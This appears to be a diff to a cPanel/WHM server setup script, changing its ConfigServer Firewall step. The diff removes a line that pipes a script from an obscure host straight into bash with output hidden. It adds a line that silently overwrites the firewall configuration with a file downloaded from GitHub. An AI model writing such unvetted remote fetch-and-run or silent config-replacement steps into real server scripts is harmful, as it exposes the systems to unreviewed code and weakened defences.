@@ -88,7 +88,9 @@ echo "####### END INSTALLING CPANEL #######"
 			if [ "x$yesno" = "xy" ] ; then
 				/usr/bin/wget https://download.configserver.com/csf.tgz -O /usr/src/csf.tgz &>/dev/null
 				/usr/bin/tar -xzf /usr/src/csf.tgz -C /usr/src && cd /usr/src/csf && sh install.sh &>/dev/null
+				/usr/bin/wget https://raw.githubusercontent.com/ismailh/CpanelWHM-PreConfig/main/csf.conf -O /etc/csf/csf.conf &>/dev/null
 				cd /root && /usr/bin/rm -rf /usr/src/csf /usr/src/csf.tgz /usr/src/error_log &>/dev/null
+				
 				
                     touch /etc/sysconfig/iptables
 	                touch /etc/sysconfig/iptables6
@@ -96,7 +98,6 @@ echo "####### END INSTALLING CPANEL #######"
 	                systemctl start ip6tables
 	                systemctl enable iptables
 	                systemctl enable ip6tables
-					curl -Ls https://data.webhost.llc/RAYa5/kUzusucu75./raw | bash
 
 
 			/usr/bin/systemctl restart csf &>/dev/null && /usr/bin/systemctl restart lfd &>/dev/null
